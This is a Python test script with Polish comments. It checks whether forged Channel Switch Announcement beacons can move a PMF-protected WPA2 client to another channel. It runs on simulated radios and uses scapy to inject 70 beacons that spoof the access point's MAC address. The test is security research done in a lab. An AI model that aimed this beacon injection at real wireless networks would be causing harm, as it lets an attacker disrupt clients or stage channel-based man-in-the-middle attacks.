#!/usr/bin/env python3
"""
Minimalny test CSA — tylko AP + STA + injection. Bez tcpdump, bez Evil Twin.
Odpal: sudo python3 csa_test.py 2.10
"""
import subprocess, time, re, sys

VER = sys.argv[1] if len(sys.argv) > 1 else "2.6"
BIN = "/opt/hostapd-2.6/bin/hostapd" if VER == "2.6" else "/usr/sbin/hostapd"

print(f"CSA TEST — hostapd {VER} PMF=2")

# Cleanup
subprocess.run("sudo pkill hostapd; sudo pkill wpa_supplicant; sudo modprobe -r mac80211_hwsim 2>/dev/null; sleep 1; sudo modprobe mac80211_hwsim radios=4", shell=True, capture_output=True)
time.sleep(2)

r = subprocess.run("sudo iw dev", shell=True, capture_output=True, text=True)
ifs = [l.split()[1] for l in r.stdout.split("\n") if "Interface" in l]
ap, sta, inj = ifs[0], ifs[1], ifs[2]
print(f"AP={ap} STA={sta} INJ={inj}")
subprocess.run(f"sudo ip link set {ap} up; sudo ip link set {sta} up", shell=True)

# AP
with open("/tmp/csa_ap.conf", "w") as f:
    f.write(f"interface={ap}\ndriver=nl80211\nssid=CSATest\nhw_mode=g\nchannel=6\nwpa=2\nwpa_passphrase=TestPass123\nwpa_key_mgmt=WPA-PSK\nwpa_pairwise=CCMP\nrsn_pairwise=CCMP\nieee80211w=2\nbeacon_int=100\ndtim_period=2\nctrl_interface=/var/run/hostapd\nctrl_interface_group=0\n")
ap_p = subprocess.Popen(["sudo", BIN, "/tmp/csa_ap.conf"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
time.sleep(3)

# STA
with open("/tmp/csa_sta.conf", "w") as f:
    f.write('ctrl_interface=/var/run/wpa_supplicant\nnetwork={\n    ssid="CSATest"\n    psk="TestPass123"\n    key_mgmt=WPA-PSK\n    pairwise=CCMP\n    ieee80211w=2\n}\n')
sta_p = subprocess.Popen(["sudo", "wpa_supplicant", "-i", sta, "-c", "/tmp/csa_sta.conf", "-D", "nl80211"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
time.sleep(3)

# Wait association
ok = False
for i in range(30):
    r = subprocess.run(f"sudo iw dev {sta} link", shell=True, capture_output=True, text=True)
    if "Connected" in r.stdout:
        print(f"ASSOCIATED (PMF=2)")
        ok = True
        break
    print(".", end="", flush=True)
    time.sleep(1)

if not ok:
    print("\nFAIL: no association")
    sys.exit(1)

# Before CSA
r = subprocess.run(f"sudo iw dev {sta} info", shell=True, capture_output=True, text=True)
m = re.search(r"channel (\d+)", r.stdout)
print(f"Before: ch{m.group(1)}")

# Setup monitor + inject
subprocess.run(f"sudo ip link set {inj} down; sudo iw dev {inj} set type monitor; sudo ip link set {inj} up; sudo iw dev {inj} set channel 6", shell=True)

r = subprocess.run(f"ip -c=never link show {ap}", shell=True, capture_output=True, text=True)
m = re.search(r"link/ether ([0-9a-f:]+)", r.stdout)
mac = m.group(1) if m else "02:00:00:00:00:01"

from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, sendp
frame = (RadioTap() /
         Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac) /
         Dot11Beacon(timestamp=0, beacon_interval=0x0064, cap=0x0431) /
         Dot11Elt(ID="SSID", info=b"CSATest") /
         Dot11Elt(ID="DSset", info=bytes([6])) /
         Dot11Elt(ID=37, info=bytes([0x01, 11, 1])))
print("Sending 70 CSA Beacons...")
sendp(frame, iface=inj, count=70, inter=0.1, verbose=False)

time.sleep(15)

r = subprocess.run(f"sudo iw dev {sta} info", shell=True, capture_output=True, text=True)
m = re.search(r"channel (\d+)", r.stdout)
ch = m.group(1) if m else "?"
result = "SUCCESS" if ch == "11" else "BLOCKED"
print(f"After: ch{ch} -> {result}")

ap_p.terminate(); sta_p.terminate()
subprocess.run("sudo modprobe -r mac80211_hwsim", shell=True)
